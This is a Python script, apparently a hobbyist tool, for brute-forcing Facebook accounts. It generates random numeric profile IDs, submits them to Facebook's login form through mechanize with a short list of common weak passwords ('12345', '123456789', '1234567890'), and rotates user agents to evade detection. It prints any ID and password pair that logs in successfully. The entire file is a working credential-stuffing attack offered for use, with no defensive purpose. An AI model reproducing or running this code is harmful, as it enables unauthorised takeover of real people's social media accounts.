
import os
try:
	import mechanize
except:
	os.system('pip install mechanize')
import mechanize
import sys
import time
import random 
import argparse
P,G,R="\033[0;35m",'\033[0;32m',"\033[0;31m"
#https://www.facebook.com/profile.php?id=
try:
	import user_agent
except:
	os.system('pip install user_agent')
from user_agent import generate_user_agent
def brute():
	ll=["1234512345",'123456789','12345']
	while True:
		defoult='1000'
		kay="123456789"
		id=str(''.join(random.choice(kay)for i in range(11)))
		id_finally=defoult+id
		password='12345'
		url='https://www.facebook.com/login.php'
		browser=mechanize.Browser()
		browser.set_handle_robots(False)
		browser.addheaders=[('User-Agent',generate_user_agent())]
		browser.open(url)
		browser.select_form(nr=0)
		browser.form['email'] = id_finally
		browser.form['pass'] = password
		browser.submit()
		url_get=browser.geturl()
		if 'save-device' in url_get:
			print(G+'ID Account : '+id_finally)
			print(G+'Password Account : '+password)
			ll=input(G+'continue ? y/n : ')
			if ll == 'n' or ll == 'N':
				break
		else:
			list=["1234512345","1234567890",'123456789']
			for xx in list:
				url='https://www.facebook.com/login.php'
				browser=mechanize.Browser()
				browser.set_handle_robots(False)
				browser.addheaders=[('User-Agent',generate_user_agent())]
				browser.open(url)
				browser.select_form(nr=0)
				browser.form['email'] = id_finally
				browser.form['pass'] = xx
				browser.submit()
				url_get=browser.geturl()
				non=id_finally
				psnon=xx
				print(R+f'Faild ID {P}[{R}{non}{P}] {R}password {P}[{R}{psnon}{P}]')
						
			
def satart():
	parse=argparse.ArgumentParser(description='Coding Bay issam iso')
	parse.add_argument('-start','--start',help='Start Brout Forse Random ',action='store_true')
	args=parse.parse_args()
	if args.start:
                try:
                    brute()
                except:
                    sys.exit()
if(__name__ == '__main__'):
		satart()
		
		
